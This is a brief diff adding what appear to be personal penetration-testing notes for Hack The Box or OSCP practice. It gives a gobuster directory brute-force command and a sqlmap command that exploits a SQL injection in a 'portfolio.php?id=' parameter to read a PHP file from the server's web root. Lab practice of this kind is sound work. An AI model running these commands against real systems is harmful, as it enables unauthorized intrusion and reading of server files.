@@ -1,0 +1,11 @@
+ ref https://www.youtube.com/watch?v=Iu364mYCxvo&t=204s
+ 
+ Gobuster 
+ (sudo apt-get install gobuster)
+ wordlist ref
+ https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt
+ 
+ gobuster dir -u http://IP:PORT/ -w /home/oscp/Documents/HTB/wordlist/common.txt -x php,html
+ 
+ sqlmap (Exam Restrictions)
+ sqlmap -u 'http://IP:PORT/portfolio.php?id=1' --file-read=/var/www/html/administrat/panel.php
